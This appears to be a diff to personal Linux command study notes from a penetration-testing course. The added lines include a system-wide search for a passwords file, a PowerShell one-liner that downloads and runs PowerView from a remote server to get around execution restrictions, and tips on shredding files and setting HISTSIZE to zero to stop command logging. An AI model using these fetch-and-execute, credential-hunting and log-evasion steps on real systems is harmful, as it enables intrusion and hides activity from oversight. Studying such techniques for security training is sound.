@@ -6,7 +6,7 @@
 - cat
 - pwd
 - echo
-- `find -name passwords.txt`
+- `find / -name passwords.txt 2>/dev/null`
 - `grep "text" file.txt`
 - wc -l -b to count entries by byte or line etc.
 - base64: for example `base64 -d data.txt` decodes the file content.
@@ -27,7 +27,7 @@
 - Python `HTTPServer` turns your computer into a quick and easy web server that you can use to serve your own files, where they can then be downloaded by another computing using commands such as curl and wget.
   + `python3 -m http.server` is used to start an hhtp server in the directory where the command was run.
   + `wget http://{machineIP}:8000/{some file name}` is used to download some file from the webserver hosted on the {machineIP}.
-    
+  + on powershell, we can use tools that are not allowed to execute by loading them from the internet for example my linux server. after running the server in the folder where powerview.ps1 exists, we can use the following to load it: `iex (new-object net.webclient).downloadstring('http://{server-IP}/PowerView.ps1')`. then we can execute the commands of powerview.
 - `ps` command is used to provide a list of the running processes as our user's session and some additional information. To see the processes run by other users and those that don't run from a session (i.e. system processes), we need to provide aux to the ps command like so: `ps aux`
   
 - `top` gives you real-time statistics about the processes running on your system instead of a one-time view.
@@ -65,6 +65,8 @@
   + reverse order: `-r`
   + sort numerically: `-n`
 
+- shred: it is used to overwrite the specified file repeatedly so it would be hard to recover.
+- we have the variable `$HISTSIZE` which points to the terminal history, we can `export HISTSIZE=0` to stop recording commands executed.
 ## Notes
 - `sudo !!`: executes the previous command with root privilege.
 - The operator & allows us to execute commands in the background.
